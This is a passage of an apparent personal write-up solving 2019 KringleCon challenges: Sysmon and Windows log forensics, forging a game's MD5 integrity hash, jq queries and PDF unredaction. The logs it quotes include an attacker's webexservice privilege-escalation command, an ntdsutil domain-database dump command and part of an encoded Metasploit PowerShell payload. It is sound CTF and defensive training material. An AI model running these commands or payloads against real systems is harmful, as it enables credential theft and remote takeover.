AuthenticationPackage
CommandLine
CreationUtcTime
DestinationHostname
DestinationIp
DestinationPort
EventID
facility
gl2_message_id
level
LogonProcess
LogonType
message
ParentProcessCommandLine
ParentProcessId
ParentProcessImage
ProcessId
ProcessImage
Protocol
source
SourceHostname
SourceHostName
SourceIp
SourceNetworkAddress
SourcePort
TargetFilename
timestamp
UserAccount
UserAccountSID
WindowsLogType
```

As we know that we're looking for logs from Minty Candycane, it will likely be easiest to figure out what value of _UserAccount_ corresponds to her account. By selecting for "Quick Values" on that field, we get the following list:
```
minty             47.98%    1,285	
holly	          31.22%    836	
alabaster	      5.97%     160	
-	              3.92%     105	
ELFU-RES-WKS2$    3.62%     97
```
Given this, I queried for all logs with a _UserAccount_ value of _minty_. Looking at the "Quick Values" of the _ProcessName_ field, one of the images identified as uncommon stands out: "C:\Users\minty\Downloads\cookie_recipe.exe". This is the answer to the first question.

>The malicious file downloaded and executed by Minty gave the attacker remote access to his machine. What was the ip:port the malicious file connected to first?

Given that we already have the name of the executable file, this will be as simple as querying for Sysmon EventId 3 (NetworkConnect) logs, with a ProccessName of the previously discovered executable. The following query does so:
```
EventID:3 AND ProcessImage:C\:\\Users\\minty\\Downloads\\cookie_recipe.exe
```
This query gives us the information we're after, a destination IP of 192.168.247.175 and a port of 4444, the default Meterpreter port. 

>What was the first command executed by the attacker?

For this, we will be looking for Sysmon EventId 1, ProcessCreate, logs with a ParentProcessImage of the identified file.
```
EventID:1 AND ParentProcessImage:C\:\\Users\\minty\\Downloads\\cookie_recipe.exe
```
Using this query, we quickly find the following CommandLine:
```
C:\Windows\system32\cmd.exe /c "whoami "
```

So, the first command the attacker ran is _whoami_. 

>What is the one-word service name the attacker used to escalate privileges?

Using the same query as above, we now look for commands involving Windows services, and find:
```
C:\Windows\system32\cmd.exe /c "cmd.exe /c sc start webexservice a software-update 1 wmic process call create "cmd.exe /c C:\Users\minty\Downloads\cookie_recipe2.exe" "
C:\Windows\system32\cmd.exe /c "cmd /c sc query type= service "
C:\Windows\system32\cmd.exe /c "Get-Service "
C:\Windows\system32\cmd.exe /c "sc query type= service "
```

Given these, it is easy to pick out that the service used to escalate privilege is _webexservice_.

>What is the file-path + filename of the binary ran by the attacker to dump credentials?

Given the previously identified elevation of service, we again query for ProcessCreate logs, this time with a parent process of cookie_recipe2.exe.
```
EventID:1 AND ParentProcessImage:C\:\\Users\\minty\\Downloads\\cookie_recipe2.exe
```

With this query, we can identify that [mimikatz](https://github.com/gentilkiwi/mimikatz), a password dumping utility, was downloaded and renamed to "C:\cookie.exe". This is, in turn, the answer to this question. 

>The attacker pivoted to another workstation using credentials gained from Minty's computer. Which account name was used to pivot to another machine?

Since we've already identified when the attacker dumped credentials, we can search for all events from the same host in the surrounding five minutes using the "Show surrounding messages" option within that event. This reveals a ProcessCreate event for "cmd.exe" on the same box under the account _alabaster_, indicating that this user is the one used to pivot to another box. Not quite content with this, I walked the process tree back, discovering that initial access was via "C:\Windows\PAExec-4236-DEFANELF.exe". Given the name, I believe that this is [PSExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) renamed.

>What is the time ( HH:MM:SS ) the attacker makes a Remote Desktop connection to another machine?

Knowing both the account used and the originating box, I constructed the following query, using [Logon Type 10: Remote Interactive](https://social.technet.microsoft.com/Forums/Lync/en-US/ff70e069-5453-4250-b5c7-8d52ce558ce2/logon-types-in-windows-server?forum=winserverDS).
```
AccountName:alabaster AND LogonType:10
```

This gives us one successful logon at 2019-11-19 06:04:28. Walking backwards from this, we can determine that the attacker logged in remotely via PowerShell, then added the _alabaster_ account to the local security group ["Remote Desktop Users"](https://www.liquidweb.com/kb/remote-desktop-users-group/), allowing them interactive access to the box via RDP. It's worth noting that _ServerManager.exe_ was started upon login, indicating that _ELFU-RES-WKS2_ is running Windows Server 2016 or newer as its OS.

>The attacker navigates the file system of a third host using their Remote Desktop Connection to the second host. What is the SourceHostName,DestinationHostname,LogonType of this connection?

Using the information identified above, the below query will yield logons from the second box to any other box.
```
(AccountName:alabaster OR UserAccount:alabaster) AND NOT DestinationHostname:elfu\-res\-wks2 AND EventID:4624
```

With this, we can identify a successsful authentication from _ELFU-RES-WKS2_ to _elfu-res-wks3_, with LogonType 3 - Batch.

>What is the full-path + filename of the secret research document after being transferred from the third host to the second host?

Since this file must have been created on _ELFU-RES-WKS2_, we can search for file creations on that workstation in the five minutes after the successful authentication. 
```
source:elfu\-res\-wks2 AND EventID:2
```

This results in under 20 logs, one of which is the creation of the file "C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf."

>What is the IPv4 address (as found in logs) the secret research document was exfiltrated to?

Using the below query to find any logs that contain the identified filename, we can easily identify that the process with ID _1232_ is a PowerShell command that uploads the document.
```
source:elfu\-res\-wks2 AND "C:\\Users\\alabaster\\Desktop\\super_secret_elfu_research.pdf"
```

ProcessId in hand, we can then query for NetworkConnect events from this process.
```
source:elfu\-res\-wks2 AND ProcessId:1232
```

This returns one result, with IP 104.22.3.84. As reward for our help, Pepper tells us the following:

>That's it - hooray!
>Have you had any luck retrieving scraps of paper from the Elf U server?
>You might want to look into SQL injection techniques.
>OWASP is always a good resource for web attacks.
>For blind SQLi, I've heard Sqlmap is a great tool.
>In certain circumstances though, you need custom tamper scripts to get things going!

I guess we will be doing SQL injection at some point. [SQLMap](http://sqlmap.org/) is a great tool, as mentioned, and supports [custom tamper scripts](https://pen-testing.sans.org/blog/2017/10/13/sqlmap-tamper-scripts-for-the-win) to account for custom encoding schemes.


### Holiday Hack Trail
[Link to the HHT](https://trail.elfu.org/?challenge=trail)
>Hi! I'm Minty Candycane!
>I just LOVE this old game!
>I found it on a 5 1/4" floppy in the attic.
>You should give it a go!
>If you get stuck at all, check out this year's talks.
>One is about web application penetration testing.
>Good luck, and don't get dysentery!

I guess I'm playing the ~~Oregon~~ Holiday Hack Trail.

Upon initial access, we're faced with a splash page offering three gamemodes: Easy, Medium and Hard.

Because I'm a masachist, I selected Hard.

After starting the game with a fair amount of resources, I looked for hidden client-side values. In [my previous experience hacking games](https://micrictor.github.io/Video-Games-To-Malware/), I learned that a _lot_ of video games place too much trust in the client to not modify values. This game was no expception, with the following hidden values:
```
    <input type="hidden" name="difficulty" class="difficulty" value="2">
    <input type="hidden" name="money" class="difficulty" value="1500">
    <input type="hidden" name="distance" class="distance" value="61">
    <input type="hidden" name="curmonth" class="difficulty" value="9">
    <input type="hidden" name="curday" class="difficulty" value="3">
    <input type="hidden" name="name0" class="name0" value="Sam">
    <input type="hidden" name="health0" class="health0" value="100">
    <input type="hidden" name="cond0" class="cond0" value="0">
    <input type="hidden" name="cause0" class="cause0" value="">
    <input type="hidden" name="deathday0" class="deathday0" value="0">
    <input type="hidden" name="deathmonth0" class="deathmonth0" value="0">
    <input type="hidden" name="name1" class="name1" value="Emmanuel">
    <input type="hidden" name="health1" class="health1" value="100">
    <input type="hidden" name="cond1" class="cond1" value="0">
    <input type="hidden" name="cause1" class="cause1" value="">
    <input type="hidden" name="deathday1" class="deathday1" value="0">
    <input type="hidden" name="deathmonth1" class="deathmonth1" value="0">
    <input type="hidden" name="name2" class="name2" value="Vlad">
    <input type="hidden" name="health2" class="health2" value="100">
    <input type="hidden" name="cond2" class="cond2" value="0">
    <input type="hidden" name="cause2" class="cause2" value="">
    <input type="hidden" name="deathday2" class="deathday2" value="0">
    <input type="hidden" name="deathmonth2" class="deathmonth2" value="0">
    <input type="hidden" name="name3" class="name3" value="Ron">
    <input type="hidden" name="health3" class="health3" value="100">
    <input type="hidden" name="cond3" class="cond3" value="0">
    <input type="hidden" name="cause3" class="cause3" value="">
    <input type="hidden" name="deathday3" class="deathday3" value="0">
    <input type="hidden" name="deathmonth3" class="deathmonth3" value="0">
    <input type="hidden" name="reindeer" class="reindeer" value="2">
    <input type="hidden" name="runners" class="runners" value="2">
    <input type="hidden" name="ammo" class="ammo" value="10">
    <input type="hidden" name="meds" class="meds" value="2">
    <input type="hidden" name="food" class="food" value="84">
    <input type="hidden" name="hash" class="hash" value="a0f3601dc682036423013a5d965db9aa">
```

Using the in-browser developer tools, I'm just going to change the _distance_ field to "9999" and hit "Go".

```
Sorry, something's just not right about your status: badHash
You have fallen off the trail.™
```

Well, that's unfortunate. Looks like that last field, "hash", is implemented as a [checksum](https://en.wikipedia.org/wiki/Checksum). From experience, that hash looks like it is the same length as a [MD5](https://en.wikipedia.org/wiki/MD5) hash. With this, I used a Bash terminal and the [md5sum](https://linux.die.net/man/1/md5sum) command to see if I can determine how the hash is generated. My first guess is that the values are concatenated, then hashed.
```
micrictor@linux:~$ echo "215006193Sam100000Emmanuel100000Vlan100000Ron1000002210284"|md5sum
593bf9d1b676418b40c24d92eda51549  -
```

Well, that's not it. Maybe, since it's a webapp, it's the values as if they were being provided as [a query string](https://en.wikipedia.org/wiki/Query_string)
```
micrictor@linux:~$ echo "difficulty=2&money=1500&distance=61&curmonth=9&curday=3&name0=Sam&health0=100&cond0=0&deathday0=0&deathmonth0=0&name1=Emmanuel&health1=100&cond1=0&deathday1=0&deathmonth0=0&name2=Vlan&health2=100&cond2=0&d
eathday2=0&deathmonth2=0&name3=Ron&health3=100&cond3=0&deathday3=0&deathmonth3=0&reindeer=2&runners=2&ammo=10&meds=2&foo
d=84"|md5sum
ad12102c845b92452438a0d4771b1808  -
```

Still not it. Running out of ideas, I used the in-browser developer tools to view a valid network request, which had the following format:
```
pace=0&playerid=JebediahSpringfield&action=go&difficulty=2&money=1500&distance=0&curmonth=9&curday=1&name0=Evie&health0=100&cond0=0&cause0=&deathday0=0&deathmonth0=0&name1=Sam&health1=100&cond1=0&cause1=&deathday1=0&deathmonth1=0&name2=Ron&health2=100&cond2=0&cause2=&deathday2=0&deathmonth2=0&name3=Jane&health3=100&cond3=0&cause3=&deathday3=0&deathmonth3=0&reindeer=2&runners=2&ammo=10&meds=2&food=100&hash=bc573864331a9e42e4511de6f678aa83
```

Hashing this also doesn't match our target hash. Failing this, I took a break to play the game as intended on hard mode and won on my first try. I guess that's all I needed to complete the challenge in Minty's eyes, as she tells us the following:

>You made it - congrats!
>Have you played with the key grinder in my room? Check it out!
>It turns out: if you have a good image of a key, you can physically copy it.
>Maybe you'll see someone hopping around with a key here on campus.
>Sometimes you can find it in the Network tab of the browser console.
>Deviant has a great talk on it at this year's Con.
>He even has a collection of key bitting templates for common vendors like Kwikset, Schlage, and Yale.

Seems like we will be taking a dive into physical penetration testing, creating a copy of a key based on a picture.


Back to trying to hack the game, it turns out _Easy_ and _Medium_ are much simpler to hack.

Easy mode passes the values identified above as parameters to the URL, as seen in the virtual entry box. Modifying the distance value to _7990_, almost all of the way to the end, results in successful completion of the game.

In Medium mode, the way that the values are passed is identical to Hard, with the exception of the security hash, which is completely absent. Because of this, it is trivial to modify the distance as done previously on Hard.

For now, I'm leaving Hard incomplete. I know that the hash is MD5, and that it is in some way used to verify that the data being sent is untampered. I cannot, however, determine what the input to MD5 should be. Knowing this would permit us, or any attacker, to provide arbitrary data into the state of the game, resulting in easy winds.



After a multiday break for the holidays, I took another try at it. Pursing a different approach, I decided I would try to crack the hash, successfully getting the following value:
```
micrictor@ubuntu:~$ cat hashes.txt
bc573864331a9e42e4511de6f678aa83
micrictor@ubuntu:~$ hashcat -m 0 -a 3 --increment --increment-min 1 hashes.txt ?d?d?d?d?d?d?d?d?d?d?d?d
...
bc573864331a9e42e4511de6f678aa83:1626
```

So, for whatever reason, the hash for the initial game state previously referenced is of the string "1626". This is too small to be any kind of sequential reference like I initially attempted, and also too small to be a product of the given values. With this in mind, I was able to determine that the hash was of a sum of specific values, as follows: 

```MD5(Money + Distance + curMonth + curDay + Reindeer + Runners + Ammo + Meds + Food)```

By adding the values for the current state and the desired distance of 7990, we get a value of _9616_, which has a MD5 hash of _9103820024efb30b451d006dc4ab3370_. By using in-browser developer tools to change the values of their respective inputs, hitting 
"Go" results in an instant win. For winning in Hard mode, we get the following message, hidden as an HTML comment:
  1.  When I'm down, my F12 key consoles me
  2.  Reminds me of the transition to the paperless naughty/nice list...
  3.  Like a present stuck in the chimney!  It got sent...
  4.  We keep that next to the cookie jar
  5.  My title is toy maker the combination is 12345
  6.  Are we making hologram elf trading cards this year?
  7.  If we are, we should have a few fonts to choose from
  8.  The parents of spoiled kids go on the naughty list...
  9.  Some toys have to be forced active
  10.  Sometimes when I'm working, I slide my hat to the left and move odd things onto my scalp! 


As per the hint given by [Kent](#iptables), this information may come in handy when it comes time to [gain entry to the sleigh shop](#open-sleigh-shop-door).


### JQ
[Cranberry Pi Terminal](https://docker2019.kringlecon.com/?challenge=jq)
>Wunorse Openslae here, just looking at some Zeek logs.
I'm pretty sure one of these connections is a malicious C2 channel...
Do you think you could take a look?
I hear a lot of C2 channels have very long connection times.
Please use jq to find the longest connection in this data set.
We have to kick out any and all grinchy activity!

To get to this challenge in-game, you must gain access to the Sleigh Shop by completing [objective 11](#open-sleigh-shop-door).

For this challenge, we will be using [jq](https://stedolan.github.io/jq/) to analyze [Zeek](https://www.zeek.org/) network logs, looking for the longest connection. 

An interesting note, Zeek by default creates logs in tab-seperated values, TSV, format, and ships with a tool named [zeekcut](https://github.com/zeek/zeek-aux/tree/master/zeek-cut) for handling the TSV files. In most modern deployments, however, Zeek is configured to output logs in JSON format for ease of processing and integration into existing data infrastructure. 

In a departure from my normal walk-through method, I'm going to present my solution first, then discuss what it does and why it works.

```jq -s 'sort_by(.duration) | reverse | .[] | {src_ip: .["id.orig_h"], dst_ip: .["id.resp_h"], duration: .duration}' conn.log > jq_conn.log```

First, I had to use the _-s_ flag to specify that all of the inputs should be read into one array. This is because the [built-in function](https://stedolan.github.io/jq/manual/#Builtinoperatorsandfunctions) _sort_, and it's related function _sort\_by_, require the input to be an array.

The first function in the pipeline, _sort\_by_, is fairly self-explanitory. It sorts the provided array, in this case every conn log, by the specified field. I then reversed the sorted list so that the largest connection duration was first.

The next two pipeline elements read values out of the array, then create a custom object containing just the fields we want: Source IP, destination IP, and connection duration. The resulting object looks like this, as read from the destination file:
```
elf@0d377933fa02:~$ head jq_conn.log 
{
  "src_ip": "192.168.52.132",
  "dst_ip": "13.107.21.200",
  "duration": 1019365.337758
}
```

The discovered destination IP is the correct input that, when supplied to _runtoanswer_, tells us this:

>Thank you for your analysis, you are spot-on.
>I would have been working on that until the early dawn.
>Now that you know the features of jq,
>You'll be able to answer other challenges too.
>
>-Wunorse Openslae


An interesting note that I didn't consider until after I had already solved the problem: My JQ pipeline is unnecessarily slow. My initial effort averages around 4.5 seconds to complete. If, however, I move _reverse_ to the end:
```
elf@0d377933fa02:~$ time jq -s 'sort_by(.duration) | .[] | {src_ip: .["id.orig_h"], dst_ip: .["id.resp_h"], duration: .duration} | reverse' conn.log > jq_conn.log

real    0m3.254s
user    0m3.036s
sys     0m0.216s
```

I confirmed this result with 100 tests each, and the reduction in time requirement of approximately one second remained true. 

The reason that moving _reverse_ has such a significant impact is as simple as the size of the data being reversed. In the initial version, the data being processed included every field of the logs, while moving it to the end effectively reduced the size of the array being shuffled, reducing the time needed to complete the operation.

Moving on, if we talk to Wunorse after completing the challenge, he says:
>That's got to be the one - thanks!
Hey, you know what? We've got a crisis here.
You see, Santa's flight route is planned by a complex set of machine learning algorithms which use available weather data.
All the weather stations are reporting severe weather to Santa's Sleigh. I think someone might be forging intentionally false weather data!
I'm so flummoxed I can't even remember how to login!
Hmm... Maybe the Zeek http.log could help us.
I worry about LFI, XSS, and SQLi in the Zeek log - oh my!
And I'd be shocked if there weren't some shell stuff in there too.
I'll bet if you pick through, you can find some naughty data from naughty hosts and block it in the firewall.
If you find a log entry that definitely looks bad, try pivoting off other unusual attributes in that entry to find more bad IPs.
The sleigh's machine learning device (SRF) needs most of the malicious IPs blocked in order to calculate a good route.

Someone's been injecting bad data into the Santa Route Finder, and Wunorse wants our help filtering out their data. In particular, he called out LFI, XSS, SQLi, and shell exploits as ones that he is worried about. 


## CTF Challenges

### Talk to Santa

This challenge is probably the most straightforward. After entering ElfU, we need to talk to Santa. He tells us the following:

>This is a little embarrassing, but I need your help.
>Our KringleCon turtle dove mascots are missing!
>They probably just wandered off.
>Can you please help find them?
>To help you search for them and get acquainted with KringleCon, I’ve created some objectives for you. You can see them in your badge.
>Where's your badge? Oh! It's that big, circle emblem on your chest - give it a tap!
>We made them in two flavors - one for our new guests, and one for those who've attended both KringleCons.
>After you find the Turtle Doves and complete objectives 2-5, please come back and let me know.
>Not sure where to start? Try hopping around campus and talking to some elves.
>If you help my elves with some quicker problems, they'll probably remember clues for the objectives.

### Two Turtle Doves

As Santa requested, we hop around for a bit to find the two turtle doves. We eventually find them, appearantly named Michael and Jane, in the student lounge at the top of the main quad. They do seem a little confused:
>Hoot Hooot?

### Unredact Threatening Document
>Someone sent a threatening letter to Elf University. What is the first word in ALL CAPS in the subject line of the letter? Please find the letter in the Quad.


As indicated, we must locate this letter first. After hopping around for a bit, we can find the letter in the top left corner of the main quad. After downloading a copy as a PDF, we can immediately see that the letter is, at least in theory, almost completely redacted. However, it appears that the person responsible for doing the redactions did it [using one of many](https://nakedsecurity.sophos.com/2011/04/18/how-not-to-redact-a-pdf-nuclear-submarine-secrets-spilled/) [improper methods](https://www.vice.com/en_us/article/8xpye3/paul-manafort-russia-case-redaction-fail). Luckily for us, this enables us to select all the text and paste it into a notepad document for viewing.

```
Date: February 28, 2019
To the Administration, Faculty, and Staff of Elf University
17 Christmas Tree Lane
North Pole
From: A Concerned and Aggrieved Character
Subject: DEMAND: Spread Holiday Cheer to Other Holidays and Mythical Characters… OR
ELSE!
Attention All Elf University Personnel,
It remains a constant source of frustration that Elf University and the entire operation at the
North Pole focuses exclusively on Mr. S. Claus and his year-end holiday spree. We URGE
you to consider lending your considerable resources and expertise in providing merriment,
cheer, toys, candy, and much more to other holidays year-round, as well as to other mythical
characters.
For centuries, we have expressed our frustration at your lack of willingness to spread your
cheer beyond the inaptly-called “Holiday Season.” There are many other perfectly fine
holidays and mythical characters that need your direct support year-round.
If you do not accede to our demands, we will be forced to take matters into our own hands.
We do not make this threat lightly. You have less than six months to act demonstrably.
Sincerely,
--A Concerned and Aggrieved Character
Confidential
Confidential
```

Somebody is *not* happy with the Claus Company and the way they do things. Regardless, the answer to the prompt for this objective is "DEMAND".


### Windows Log Analysis: Attack Outcome
>We're seeing attacks against the Elf U domain! Using the event log data, identify the user account that the attacker compromised using a password spray attack. Bushy Evergreen is hanging out in the train station and may be able to help you out.

[Event log download](https://downloads.elfu.org/Security.evtx.zip)

The first of a series of Windows log analysis challenges, this one involves a [password spray](https://doubleoctopus.com/security-wiki/threats-and-tools/password-spraying/). As this attack heavily involves Windows authentication, the main focus will be [Event ID 4624](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4624), successful logons, and [Event ID 4625](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625), failed logons. 

Due to the nature of a password spray, we will be able to identify the source of the spray by identifying a source IP with an usually high amount of failed logon attempts. As per [Bushy's hint](#ed-escape), I will be using [DeepBlueCLI](https://github.com/sans-blue-team/DeepBlueCLI).

```
PS D:\Projects\DeepBlueCLI> ./DeepBlue.ps1 $HOME/Documents/Security.evtx

Date    : 11/19/2019 4:22:46 AM
Log     : Security
EventID : 4648
Message : Distributed Account Explicit Credential Use (Password Spray Attack)
Results : The use of multiple user account access attempts with explicit credentials is an indicator of a password
          spray attack.
          Target Usernames: ygoldentrifle esparklesleigh hevergreen Administrator sgreenbells cjinglebuns
          tcandybaubles bbrandyleaves bevergreen lstripyleaves gchocolatewine wopenslae ltrufflefig supatree
          mstripysleigh pbrandyberry civysparkles sscarletpie ftwinklestockings cstripyfluff gcandyfluff smullingfluff
          hcandysnaps mbrandybells twinterfig civypears ygreenpie ftinseltoes smary ttinselbubbles dsparkleleaves
          Accessing Username: -
          Accessing Host Name: -

Command :
Decoded :
...
Date    : 8/23/2019 5:00:20 PM
Log     : Security
EventID : 4672
Message : High number of logon failures for one account
Results : Username: ygoldentrifle
          Total logon failures: 77
Command :
Decoded :
...
Date    : 8/23/2019 5:00:20 PM
Log     : Security
EventID : 4672
Message : High number of logon failures for one account
Results : Username: supatree
          Total logon failures: 76
Command :
Decoded :
```

As expected, DeepBlueCLI successfully identifies the password spray, and reports that 31 accounts have a high number of logon failures. In order to determine the account that was successfully exploited, I identified that most of the accounts have 77 failed logons, while _supatree_ has only 76, indicating that the password spray successfully authenticated to this account. 


### Windows Log Analysis: Attacker Technique
>Using [these normalized Sysmon logs](https://downloads.elfu.org/sysmon-data.json.zip), identify the tool the attacker used to retrieve domain password hashes from the lsass.exe process. For hints on achieving this objective, please visit Hermey Hall and talk with SugarPlum Mary.


My first thought was that, given that it extracted passwords from lsass.exe, it was probably [mimikatz](https://github.com/gentilkiwi/mimikatz). But, rather than simply guess this in the Objectives screen and risk tainting my analysis, I downloaded and unzipped the SysMon logs.

If I were doing this for work, I would upload the JSON file to Splunk or Elastic for analysis. Failing that, I would probably use [jq](https://stedolan.github.io/jq/). But, in an effort to increase my comfort in it, I will be doing the analysis using PowerShell.

First off, I read the JSON file and converted to a PSObject, the stored the result as a variable for future use.

```$logs = Get-Content sysmon-data.json | ConvertFrom-Json```

After looking at the timestamps, it's clear the logs were written in sequence, with the most recent logs last. As I'm interested in walking down the attacker actions from the beginning, I inverted the list using _\[Array\]::Reverse($logs)_. From there, I looked at the first log to determine the available fields:
```PowerShell
PS C:\Users\micrictor\Documents\sysmon-data.json> $logs[0]
command_line        : "C:\Windows\system32\wevtutil.exe" cl Microsoft-Windows-SmbClient/Security
event_type          : process
logon_id            : 152809
parent_process_name : ?
parent_process_path : ?
pid                 : 2920
ppid                : 548
process_name        : wevtutil.exe
process_path        : C:\Windows\System32\wevtutil.exe
subtype             : create
timestamp           : 132110784098300000
unique_pid          : {7431d376-7e09-5d60-0000-001055852400}
unique_ppid         : {00000000-0000-0000-0000-000000000000}
user                : ELFU\Administrator
user_domain         : ELFU
user_name           : Administrator
```

Given that, I used _Group-Object_ to view the available _event\_type_ values:
```PowerShell
PS C:\Users\micrictor\Documents\sysmon-data.json> $logs | Group-Object -Property event_type

Count Name                      Group
----- ----                      -----
2584  process                   {@{command_line="C:\Windows\system32\wevtutil.exe" cl Microsoft-Windo...
12    registry                  {@{event_type=registry; hive=hklm; pid=616; process_name=services.exe; ...
25    file                      {@{event_type=file; file_name=__PSScriptPolicyTest_11r1mb05.zhm.ps1; ...
5     network                   {@{destination_address=192.168.86.128; destination_port=4444; ...
```

Knowing this, I looked for any _process_ events with a parent process name of "lsass.exe"
```PowerShell
PS C:\Users\micrictor\Documents\sysmon-data.json> $logs | Where-Object -Property parent_process_name -Like 'lsass.exe'
command_line        : C:\Windows\system32\cmd.exe
event_type          : process
logon_id            : 999
parent_process_name : lsass.exe
parent_process_path : C:\Windows\System32\lsass.exe
pid                 : 3440
ppid                : 632
process_name        : cmd.exe
process_path        : C:\Windows\System32\cmd.exe
subtype             : create
timestamp           : 132186398356220000
unique_pid          : {7431d376-dedb-5dd3-0000-001027be4f00}
unique_ppid         : {7431d376-cd7f-5dd3-0000-001013920000}
user                : NT AUTHORITY\SYSTEM
user_domain         : NT AUTHORITY
user_name           : SYSTEM
```

Pivoting from this to find processes spawned by this command prompt, we get the following:
```PowerShell
PS C:\Users\micri\Documents\sysmon-data.json> $logs | Where-Object -Property ppid -Eq 3440
command_line        : ntdsutil.exe  "ac i ntds" ifm "create full c:\hive" q q
event_type          : process
logon_id            : 999
parent_process_name : cmd.exe
parent_process_path : C:\Windows\System32\cmd.exe
pid                 : 3556
ppid                : 3440
process_name        : ntdsutil.exe
process_path        : C:\Windows\System32\ntdsutil.exe
subtype             : create
timestamp           : 132186398470300000
unique_pid          : {7431d376-dee7-5dd3-0000-0010f0c44f00}
unique_ppid         : {7431d376-dedb-5dd3-0000-001027be4f00}
user                : NT AUTHORITY\SYSTEM
user_domain         : NT AUTHORITY
user_name           : SYSTEM
```

The attacker utilized the [ntdsutil.exe](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc753343(v%3Dws.11)) to create a full clone of the Active Directory Domain. This is a legitimate need of system administrators, who use this functionality to create offline backups or installing a domain controller from media, also known as [IFM](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732530%28v%3dws.11%29). Attackers, however, will use this to get a copy of the database and extract all of the password hashes, which can be used to compromise privileged accounts, or create a malicious Domain Controller and own the domain.

Not content with just the answer to the challenge, "ntdsutil.exe," I went about finding out everything about the attack.

First, I took a look at the logs with _event\_type_ "registry".
```PowerShell
PS C:\Users\micri\Documents\sysmon-data.json> $logs | Where-Object -Property event_type -eq 'registry'

event_type     : registry
hive           : hklm
pid            : 616
process_name   : services.exe
process_path   : C:\Windows\system32\services.exe
registry_key   : HKLM\System\CurrentControlSet\Services\KnKvTkXn
registry_path  : HKLM\System\CurrentControlSet\Services\KnKvTkXn\Start
registry_value : Start
timestamp      : 132110784202750000
unique_pid     : {7431d376-cd7f-5dd3-0000-001010910000}

event_type     : registry
hive           : hklm
pid            : 616
process_name   : services.exe
process_path   : C:\Windows\system32\services.exe
registry_key   : HKLM\System\CurrentControlSet\Services\KnKvTkXn
registry_path  : HKLM\System\CurrentControlSet\Services\KnKvTkXn\ImagePath
registry_value : ImagePath
timestamp      : 132110784202750000
unique_pid     : {7431d376-cd7f-5dd3-0000-001010910000}
...
```

There are a total of six services created with the same pattern of eight random characters. This is consistent with the use of [Metasploit's PSExec module](https://github.com/rapid7/metasploit-framework/blob/30e86f377917f2ab086b3e52cc9def31bc34f90b/lib/msf/core/exploit/smb/client/psexec.rb#L42). As per the module source code, PSExec, by default, will then execute a compressed PowerShell payload. Looking for the establishment of C2, the first thing a payload typically does, we get this:
```PowerShell
PS C:\Users\micri\Documents\sysmon-data.json> $logs | Where-Object -Property event_type -eq 'network'
destination_address : 192.168.86.128
destination_port    : 4444
event_type          : network
pid                 : 3588
process_name        : powershell.exe
process_path        : C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
protocol            : tcp
source_address      : 192.168.86.190
source_port         : 52395
subtype             : outgoing
timestamp           : 132186396538670000
unique_pid          : {7431d376-7e14-5d60-0000-0010f0172600}
user                : NT AUTHORITY\SYSTEM
user_domain         : NT AUTHORITY
user_name           : SYSTEM
```

Our attacker came from the IP "192.168.86.128," and used the default port for meterpreter, 4444. If we want, we can find the exact payload used:
```PowerShell
PS C:\Users\micri\Documents\sysmon-data.json> $logs | Where-Object -Property pid -Eq 3588

command_line        : "C:\Windows\system32\wevtutil.exe" cl Microsoft-Windows-WMI-Activity/Debug
event_type          : process
logon_id            : 152809
parent_process_name : ?
parent_process_path : ?
pid                 : 3588
ppid                : 548
process_name        : wevtutil.exe
process_path        : C:\Windows\System32\wevtutil.exe
subtype             : create
timestamp           : 132110784122689984
unique_pid          : {7431d376-7e0c-5d60-0000-00100f732500}
unique_ppid         : {00000000-0000-0000-0000-000000000000}
user                : ELFU\Administrator
user_domain         : ELFU
user_name           : Administrator

command_line        : "C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe" -noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.Memor
                      yStream(,[System.Convert]::FromBase64String('H4sIACHe010CA7VWbW/aSBD+nEj5D1aFZFshGANt2kiVbs07wQnEQCAUnTb22iysvWCvCabtf78x4DS9plV70ll5We/OzM4888yM3TiwBeWBhEsD6fPZ6UkPh9iXlBy13w3yUi5h60A9OYGDnN2VPkrKFK1WNe5jGsyurqpxG
                      JJAHN4LTSJQFBH/kVESKar0Rbqfk5Bc3D4uiC2kz1Lu70KT8UfMjmJJFdtzIl2gwEnPutzGqS8Fa8WoUORPn2R1eqHPCvV1jFmkyFYSCeIXHMZkVfqqphcOkhVRZJPaIY+4Kwr3NCiXCsMgwi65AWsbYhIx504kqxAD/IRExGEgQTSp+uFQkWHZC7mNHCckUSTnpWlqeDqb/aVMj7fexYG
                      gPim0A0FCvrJIuKE2iQotHDiM3BF3BlqWCGngzVQVxDZ8SZRcEDOWl/7EjHJDnjLMfldJeakEUj0RqnnI4g9RmtyJGTnoya+4uc+7Ck+We4Dt69np2ambEYWuX/IEVifT/ZqAa0qPR3Qv9VEq5iUTrsGChwm85gZhTNTZM7BSbuHkf66tZ6IguClh2JmOOHVmoHFMZM63rGa6/3NC1ohLA
                      1JLAuxTO+Oc8hq+xGVkH14hE7sBnxT5eECcGmHEwyLFLE3zD2p1n4pnXSOmzCEhsiFHEXgF6VO/d+aQBkVuBybxAaDDO/Au5wLTSSZ9ZHeS3Z6+g5BcZTiK8lIvhlKz85JFMCNOXkJBRI9HKBZ8v5S/uWvGTFAbRyIzN1MzHI/3VXkQiTC2IWcQ+8BaEZtilkKRl1rUIUZiUS+7V34ViCp
                      mDEoALG0gEbCTAmCJlAkhuAhZVwsWEW1/xYgPEvuKbzDsQX0fab4nDvaII//bv4zIB9amSGQQvPAO0msxLvLSiIYCGkeKKlDov9z9ol/svaiG5JgFJauLqZGIlM+5qDRItikfj5jsEQgFRN8IuW/giLyrHNqD8ka7pVUEz6QdMNM2llRHT1Rvm/A7pOU2r106151FSwtr27mL2lHbbPVq/
                      VarsulYo4qw6m1x3WsLsz5eLCzUuhtOxEMbtQa0uJxUdqsO3Vld5Ey22rudsXsqGtvdwnPcSc11vUvXutPfNmj3vto3iiXcrdXj7r3xZBQrUZ0+tfp02F92GuJxMmJ46GreWP+A6bYbLkY6N3dthJrzsr3ruKPm3HSSSYuShVbs0j7qI3Rt3w2HTW/lNSOkfRitq/4CrRsYYdRG9VHSecu
